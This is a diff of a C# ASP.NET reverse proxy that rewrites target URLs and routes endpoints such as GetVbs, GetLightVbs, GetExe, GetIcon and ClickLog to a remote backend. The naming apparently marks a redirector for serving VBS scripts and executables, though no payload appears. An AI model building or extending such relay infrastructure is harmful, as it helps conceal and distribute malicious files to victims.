@@ -33,15 +33,17 @@ public static class Program2
         async Task ForwardRequest(HttpContext context)
         {
             var server = ServerModelLoader.ipFromHost(context.Request.Host.Host);
+     
             using var client = new HttpClient();
 
             var path = context.Request.Path.ToString();
 
             // Construct the target URL by combining the remote URL with the request path and query string
-            var targetUrl = $"{remoteUrl}{server}{path}{context.Request.QueryString}";
+            var targetUrl = $"{server}{path}{context.Request.QueryString}";
             targetUrl = targetUrl.Replace($"{server}/{server}", $"{server}");
-            
 
+            targetUrl = remoteUrl + targetUrl;
+            targetUrl = targetUrl.Replace($"{server}/{server}", $"{server}");
             // Create the request message and copy the method, headers, and content from the incoming request
             var requestMessage = new HttpRequestMessage
             {
@@ -125,26 +127,23 @@ public static class Program2
 
         app.UseDeveloperExceptionPage();
         
-        // Use a catch-all route to handle all incoming requests
-        app.Map("/", async context => { await ForwardRequest(context); });
+// Place the most specific routes first
+        app.Map("/{string}/{profile}/{random}/{target}/GetVbs", async context => { await ForwardRequest(context); });
+        app.Map("/{string}/{profile}/GetVbsPhp", async context => { await ForwardRequest(context); });
 
+        app.Map("/{string}/{profile}/{random}/{target}/GetLightVbs", async context => { await ForwardRequest(context); });
+        app.Map("/{string}/{profile}/GetLightVbsPhp", async context => { await ForwardRequest(context); });
+
+// Place routes with a single parameter next
         app.Map("/{string}/upsert", async context => { await ForwardRequest(context); });
-        
         app.Map("/{string}/update", async context => { await ForwardRequest(context); });
-        
         app.Map("/{string}/Stats", async context => { await ForwardRequest(context); });
-        
         app.Map("/{string}/ClickLog", async context => { await ForwardRequest(context); });
-
         app.Map("/{string}/GetIcon", async context => { await ForwardRequest(context); });
-
         app.Map("/{string}/GetExe", async context => { await ForwardRequest(context); });
-        
-        app.Map("/{string}/GetVbs", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/GetVbsPhp", async context => { await ForwardRequest(context); });
-        
-        app.Map("/{string}/GetLiteVbs", async context => { await ForwardRequest(context); });
-        app.Map("/{string}/GetLiteVbsPhp", async context => { await ForwardRequest(context); });
+
+// Finally, place the catch-all route
+        app.Map("/", async context => { await ForwardRequest(context); });
 
         app.Run();
     }
